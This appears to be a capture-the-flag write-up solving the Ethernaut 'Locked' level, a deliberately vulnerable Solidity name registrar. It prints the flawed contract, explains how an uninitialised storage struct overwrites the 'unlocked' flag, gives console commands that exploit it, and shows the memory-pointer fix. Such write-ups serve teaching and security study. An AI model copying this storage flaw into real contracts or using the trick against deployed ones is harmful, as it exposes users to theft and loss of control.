# Locked

This name registrar is locked and will not accept any new names to be registered.
Unlock this registrar to beat the level.
Things that might help:
* Understanding how storage works
* Understanding default storage types for local variables
* Understanding the difference between storage and memory

```javascript
pragma solidity ^0.4.23; 

// A Locked Name Registrar
contract Locked {

    bool public unlocked = false;  // registrar locked, no name updates
    
    struct NameRecord { // map hashes to addresses
        bytes32 name; // 
        address mappedAddress;
    }

    mapping(address => NameRecord) public registeredNameRecord; // records who registered names 
    mapping(bytes32 => address) public resolve; // resolves hashes to addresses
    
    function register(bytes32 _name, address _mappedAddress) public {
        // set up the new NameRecord
        NameRecord newRecord;
        newRecord.name = _name;
        newRecord.mappedAddress = _mappedAddress; 

        resolve[_name] = _mappedAddress;
        registeredNameRecord[msg.sender] = newRecord; 

        require(unlocked); // only allow registrations if contract is unlocked
    }
}
```

It maps a structure to the values which just not initialize and in storage.

That come up a problem that variable declared before struct will be replaced when any function assign a new value for struct.

This can be specified more detail in [Struct](https://solidity.readthedocs.io/en/develop/types.html#structs).

![](https://i.imgur.com/X801dhP.png)

So, just easily use register function and assign `true` bytes32 value to `_name`. 

```javascript
await contract.unlocked()
await contract.register("0x0000000000000000000000000000000000000000000000000000000000000001",0xeBa......) // any address, it doesn't matter.
await contract.unlocked()
```

Check if `unlocked` become `true`, submit it.

![](https://i.imgur.com/c6d7ut7.png)

Suggestion from ethernaut:
```
Care should be taken when using complex data types within functions. Incorrectly initialised storage variables can lead to modification of other storage variables as this level demonstrates.
```

You can see there's only warning but not error in Remix IDE, so you can deploy this vulnerabe contract. 

![](https://i.imgur.com/l13DVts.png)

This un-initialize struct problem can be solved by declare new struct with memory pointer:

![](https://i.imgur.com/2JdnYvU.png)